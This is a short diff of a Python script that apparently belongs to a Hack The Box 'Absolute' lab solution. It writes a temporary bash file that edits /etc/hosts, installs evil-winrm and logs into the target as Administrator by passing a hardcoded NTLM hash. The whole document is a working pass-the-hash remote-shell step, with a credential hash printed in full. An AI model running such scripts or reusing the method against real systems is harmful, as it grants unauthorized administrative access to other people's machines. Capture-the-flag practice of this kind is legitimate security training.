@@ -14,8 +14,8 @@ bashfile=''.join(random.choice(string.ascii_uppercase + string.digits) for _ in 
 bashfile='/tmp/'+bashfile+'.sh'
 
 f = open(bashfile, 'w')
-s = """sudo -- sh -c -e "echo '10.10.11.181 addr DC.ABSOLUTE.HTB' >> /etc/hosts";
-gem install evil-winrm
+s = """sudo -- sh -c -e "echo '10.10.11.181 addr absolute.htb' >> /etc/hosts";
+sudo gem install evil-winrm
 evil-winrm -i absolute.htb -u Administrator -H 1f4a6093623653f6488d5aa24c75f2ea
 """
 f.write(s)
